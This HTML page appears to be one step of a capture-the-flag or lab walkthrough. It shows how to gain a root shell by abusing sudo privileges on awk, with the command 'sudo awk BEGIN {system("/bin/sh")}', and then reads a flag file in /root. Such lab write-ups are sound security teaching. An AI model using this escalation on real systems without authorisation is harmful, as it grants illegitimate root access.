<body><strong>8. Gain root access using awk</strong><br /><br />Looking on the internet we'll find <a href="https://gtfobins.github.io/gtfobins/awk/#sudo">here</a> that you can abuse SUDO privileges and gain root access using “awk”.<br /><br /><br /><img src="images/44-1.png" alt="images/44-1.png" /><br /><br />Introduce that command on your shell.<br /><br /><div class="codebox"><div class="codebox">$&nbsp;<span style="color:#ff9d00;font-weight:700">sudo</span>&nbsp;<span style="color:#ff9d00;font-weight:700">awk</span>&nbsp;<span style="color:#3ad900;font-weight:400">'BEGIN&nbsp;{system("/bin/sh")}'</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;cd&nbsp;/root</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;cat&nbsp;final.txt</span></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/44-2.png" alt="images/44-2.png" /><br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>
